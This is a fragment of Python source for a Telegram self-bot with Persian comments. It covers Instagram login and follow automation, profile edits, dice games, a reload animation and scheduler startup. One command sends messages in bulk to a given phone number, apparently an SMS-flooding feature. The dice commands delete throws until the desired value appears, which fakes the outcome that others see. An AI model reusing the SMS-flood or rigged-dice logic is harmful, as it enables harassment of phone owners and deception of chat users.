    app.edit_message_text(m.chat.id , m.id , f"❖ Sending Message To [ `{text.split()[1]}` ]") 
    sms(text.split()[1])
    app.edit_message_text(m.chat.id , m.id , f"❖ **Successful!**\nAll Message Sent To [ `{text.split()[1]}` ]") 
   else:
    app.edit_message_text(m.chat.id , m.id , f"❖ Wrong Number [ `{text.split()[1]}` ]") 
  except Exception as er:
   app.edit_message_text(m.chat.id , m.id , f"❖ Please Enter Number") 
#______________________________insta________________________________
 elif text.startswith(".instalogin"):
  try:
   m.edit_text(f'.instalogin {text.split()[1].split(":")[0]}')
   api = insta.Client(text.split()[1].split(":")[0], text.split()[1].split(":")[1])
   get = api.username_info((text.split()[1].split(":")[0]))["user"]
   m.edit_text(f"""𝗜𝗻𝘀𝘁𝗮 𝗛𝗲𝗹𝗽𝗲𝗿\n\n❖ Your Login Confirmed""")  
  except:
   m.edit_text(f"❖ Login Failed") 
  else:
   write("insta_username.txt" , text.split()[1].split(":")[0])

 elif text == ".imloged":
  try :
   log = api.authenticated_user_id
   m.edit_text(f"❖ Login Successfully") 
  except:
   m.edit_text(f"❖ Login UnSuccessfully")

 elif text == ".mypageinfo":
  try:
   get = api.username_info(read("insta_username.txt"))["user"]
   m.edit_text(f"""??𝗻𝘀𝘁𝗮 𝗛𝗲𝗹𝗽𝗲𝗿\n   ❖ **ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ**\n❖ Follower : `{get["follower_count"]}`\n❖ Following : `{get["following_count"]}`\n❖ Following Tag : `{get["following_tag_count"]}`\n❖ Media Count : `{get["media_count"]}`\n❖ User iD : `{get["pk"]}`""")
  except NameError:
   m.edit_text(f"❖ ᴘʟᴇᴀꜱᴇ ʟᴏɢɪɴ ꜰɪʀꜱᴛ")
   
 elif text.startswith(".instagetuser"):
  try:
   get = api.username_info(text.split()[1])["user"]
   m.edit_text(f"""𝗜𝗻𝘀𝘁𝗮 𝗛𝗲𝗹𝗽𝗲𝗿\n❖ {text.split()[1]} Account info\n❖ Follower: `{get["follower_count"]}`\n❖ Following : `{get["following_count"]}`\n❖ Following Tag: `{get["following_tag_count"]}`\n❖ Media Count : `{get["media_count"]}`\n❖ User iD: `{get["pk"]}` """)
  except NameError:
   m.edit_text(f"❖ Please Login First")
  except insta.errors.ClientError:
   m.edit_text(f"❖ User Not Found")

 elif text.startswith(".follow"):
  try:
   api.friendships_create(api.username_info(text.split()[1])["user"]["pk"])
  except NameError as er:
   m.edit_text(f"❖ The User Was UnFollowed\n{er}")
  except insta.errors.ClientError:
   m.edit_text(f"❖ User Not Found")
  else:
   m.edit_text(f"❖ The User Was Followed")

 elif text.startswith(".unfollow"):
  try:
   api.friendships_destroy(api.username_info(text.split()[1])["user"]["pk"])
  except NameError:
   m.edit_text(f"❖ Please Login First")
  except insta.errors.ClientError:
   m.edit_text(f"❖ User Not Found") 
  else:
   m.edit_text(f"❖ The User Was UnFollowed") 
   
 elif text.startswith(".edit_firstname"):
  try:
   api.edit_profile(first_name=(m.reply_to_message.text if m.reply_to_message else text.replace(".edit_firsname" , "")[1::]))
  except NameError:
   m.edit_text(f"❖ Please Login First") 
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")
   
 elif text.startswith(".edit_biography"):
  try:
   api.edit_profile(biography=(m.reply_to_message.text if m.reply_to_message else text.replace(".edit_biography" , "")[1::]))
  except NameError:
   m.edit_text(f"❖ Please Login First") 
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")
   
#______________________________End________________________________
  
# elif text == ".explore":
#  ex = api.explore(max_id=50)
#  print(ex)
#______________________________Fun________________________________
 reloadl = ["`start Reloading`",
"░░░░░░░░░░░░░░",
"▒░░░░░░░░░░░░░",
"▒▒░░░░░░░░░░░░",
"▒▒▒░░░░░░░░░░░",
"▒▒▒▒░░░░░░░░░░",
"▒▒▒▒▒░░░░░░░░░",
"▒▒▒▒▒▒░░░░░░░░",
"▒▒▒▒▒▒▒░░░░░░░",
"▒▒▒▒▒▒▒▒░░░░░░",
"▒▒▒▒▒▒▒▒▒░░░░░",
"▒▒▒▒▒▒▒▒▒▒░░░░",
"▒▒▒▒▒▒▒▒▒▒▒░░░",
"▒▒▒▒▒▒▒▒▒▒▒▒░░",
"▒▒▒▒▒▒▒▒▒▒▒▒▒░",
"▒▒▒▒▒▒▒▒▒▒▒▒▒▒",
"▓▒▒▒▒▒▒▒▒▒▒▒▒▒",
"▓▓▒▒▒▒▒▒▒▒▒▒▒▒",
"▓▓▓▒▒▒▒▒▒▒▒▒▒▒",
"▓▓▓▓▒▒▒▒▒▒▒▒▒▒",
"▓▓▓▓▓▒▒▒▒▒▒▒▒▒",
"▓▓▓▓▓▓▒▒▒▒▒▒▒▒",
"▓▓▓▓▓▓▓▒▒▒▒▒▒▒",
"▓▓▓▓▓▓▓▓▒▒▒▒▒▒",
"▓▓▓▓▓▓▓▓▓▒▒▒▒▒",
"▓▓▓▓▓▓▓▓▓▓▒▒▒▒",
"▓▓▓▓▓▓▓▓▓▓▓▒▒▒",
"▓▓▓▓▓▓▓▓▓▓▓▓▒▒",
"▓▓▓▓▓▓▓▓▓▓▓▓▓▒",
"▓▓▓▓▓▓▓▓▓▓▓▓▓▓",
"Reloading.",
"Reloading..",
"Reloading...",
"Reloading.",
"Reloading..",
"Reloading...",
"Reloading.",
"Reloading..",
"Reloading...",
"`Reloaded! :)`",
]

 if text == "Reload":
  for i in reloadl:
   app.edit_message_text(m.chat.id,m.id,i)
   
 elif text.startswith(".tas"):
  if 0 < int(text.split()[1]) < 7:   
    app.delete_messages(m.chat.id , m.id)
    while True:
     msg = app.send_dice(m.chat.id, "🎲")
     if msg.dice.value != int(text.split()[1]):
       msg.delete()
     else:
       break
  else:
    m.edit_text(f"Please Send A Number Between 1 To 6")
    
 elif text.startswith(".dart"):
  app.delete_messages(m.chat.id , m.id)
  while True:
   msg = app.send_dice(m.chat.id, "🎯")
   if msg.dice.value != 6:
     msg.delete()
   else:
     break

 elif text.startswith(".bowling"):
  app.delete_messages(m.chat.id , m.id) 
  while True:
   msg = app.send_dice(m.chat.id, "🎳")
   if msg.dice.value != 6:
     msg.delete()
   else:
     break

 elif text.startswith(".basketball"):
  app.delete_messages(m.chat.id , m.id)
  while True:
   msg = app.send_dice(m.chat.id, "🏀")
   if msg.dice.value != 4:
     msg.delete()
   else:
     break

 elif text.startswith(".football"):
  if int(text.split()[1]) == 1 or int(text.split()[1]) == 4:   
    app.delete_messages(m.chat.id , m.id)
    while True:
     msg = app.send_dice(m.chat.id, "⚽")
     if msg.dice.value != int(text.split()[1]):
       msg.delete()
     else:
       break
  else:
    m.edit_text(f"Please Send A Number Between 1 To 4")
    
 elif text.startswith(".khaymal"):
  m.edit_text(f" در لیست خایمال ثبت شد.") 
  

 elif m.text == ".arz":
        result = app.get_inline_bot_results(bot_id, "coinprice")
        app.send_inline_bot_result(chat_id=m.chat.id, query_id=result.query_id, result_id=result.results[0].id, reply_to_message_id=m.id)
#_________________________Helper_____________________________________
 elif "پنل" == text:
  bot_results = app.get_inline_bot_results(bot_id, "panel")
  app.send_inline_bot_result(m.chat.id ,bot_results.query_id, bot_results.results[0].id)
#______________________________app run________________________________

# Scheduler را فقط تعریف می‌کنیم، اما استارت نمی‌زنیم
scheduler = AsyncIOScheduler()

async def main():
    """تابع اصلی برای راه‌اندازی و مدیریت ربات سلف."""
    
    print("Initializing self bot...")
    await app.start()
    print("Self bot client started successfully.")

    # تمام کارهای زمان‌بندی شده را در اینجا اضافه می‌کنیم
    try:
        scheduler.add_job(job, "interval", seconds=5)
        scheduler.add_job(antidelmember, "interval", seconds=5)
        scheduler.add_job(mak, "interval", hours=2)
        
        # Scheduler را *بعد از* استارت شدن app و *داخل* حلقه رویداد، شروع می‌کنیم
        scheduler.start()
        print("Self bot scheduler started successfully.")
    
    except Exception as e:
        print(f"Error starting or adding jobs to scheduler: {e}")

    # ارسال پیام "سلف فعال شد"
    try:
        await app.send_message("me", f"""**سلام! 👋

✅️سلف برات فعال شد.
برای باز شدن پنل ابتدا تو بخش ارسال پیام ایدی ربات هلپر یک فاصله و کلمه panel یک علامت بالای پیام میاد بزنید روش • پنل دستورات برات باز میشه • از ویژگی‌هاش استفاده کن و لذت ببر!

ماچ به لپت! 🍑

👨‍💻سازنده : @Anishtayin
🏖چنل : @golden_market7
🔄ورژن : 5**""")
        print("Activation message sent.")
    except Exception as e:
        print(f"Could not send activation message: {e}")


    print(Fore.YELLOW + "Self bot is now online and idle...")
    await idle()

    print("Stopping self bot...")
    scheduler.shutdown() # قبل از توقف کامل، scheduler را خاموش می‌کنیم
    await app.stop()

if __name__ == "__main__":
    # از متد run خود pyrogram برای اجرای تابع اصلی استفاده می‌کنیم
    # این متد به طور خودکار حلقه رویداد asyncio را مدیریت می‌کند
    app.run(main())

#______________________________End________________________________
